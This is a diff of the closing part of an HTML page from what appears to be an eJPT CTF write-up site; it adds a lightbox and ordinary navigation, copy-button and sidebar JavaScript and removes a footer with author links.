+<div class="lightbox" id="lightbox" onclick="closeLightbox()">
+  <img id="lightboxImg" src="" alt="POC enlarged">
 </div>
 
-<footer class="footer">
-  <div class="footer-l">
-    <span>root@aditya</span> &mdash; eJPT CTF Writeups
-  </div>
-  <div class="footer-r">
-    <a href="index.html" class="ft-link">&larr; eJPT Hub</a>
-    <a href="https://github.com/adityasingh108/ejpt-ctf-writeups" class="ft-link" target="_blank">GitHub</a>
-    <a href="https://www.linkedin.com/in/aditya-singh-9ab9b81aa/" class="ft-link" target="_blank">LinkedIn</a>
-  </div>
-</footer>
+<script>
+/* ====================================================
+   SCROLL SPY
+   ==================================================== */
+const sections = document.querySelectorAll('section[id]');
+const navLinks  = document.querySelectorAll('.nav-link');
+
+const io = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(l => {
+        l.classList.toggle('active', l.getAttribute('href') === '#' + e.target.id);
+      });
+    }
+  });
+}, { rootMargin: '-15% 0px -72% 0px', threshold: 0 });
+
+sections.forEach(s => io.observe(s));
+
+/* ====================================================
+   COPY BUTTONS
+   ==================================================== */
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const el = document.getElementById(btn.dataset.t);
+    if (!el) return;
+    const text = Array.from(el.querySelectorAll('.ln'))
+      .map(ln => {
+        const parts = [];
+        ln.querySelectorAll('span').forEach(sp => {
+          if (!sp.classList.contains('p1') &&
+              !sp.classList.contains('p2') &&
+              !sp.classList.contains('p3') &&
+              !sp.classList.contains('ps')) {
+            parts.push(sp.textContent);
+          }
+        });
+        return parts.join('').trim();
+      })
+      .filter(Boolean)
+      .join('\n');
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'copied!';
+      btn.classList.add('ok');
+      setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('ok'); }, 1800);
+    }).catch(() => {
+      btn.textContent = 'error';
+      setTimeout(() => { btn.textContent = 'copy'; }, 1500);
+    });
+  });
+});
+
+/* ====================================================
+   MOBILE SIDEBAR
+   ==================================================== */
+const sidebar   = document.getElementById('sidebar');
+const overlay   = document.getElementById('sbOverlay');
+const mobToggle = document.getElementById('mobToggle');
+
+function openSidebar()  { sidebar.classList.add('open'); overlay.classList.add('open'); }
+function closeSidebar() { sidebar.classList.remove('open'); overlay.classList.remove('open'); }
+
+mobToggle.addEventListener('click', () =>
+  sidebar.classList.contains('open') ? closeSidebar() : openSidebar()
+);
+overlay.addEventListener('click', closeSidebar);
+navLinks.forEach(l => l.addEventListener('click', closeSidebar));
+
+/* ====================================================
+   LIGHTBOX
+   ==================================================== */
+function openLightbox(src) {
+  document.getElementById('lightboxImg').src = src;
+  document.getElementById('lightbox').classList.add('open');
+}
+function closeLightbox() {
+  document.getElementById('lightbox').classList.remove('open');
+}
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeLightbox(); });
+</script>
 
 </body>
 </html>
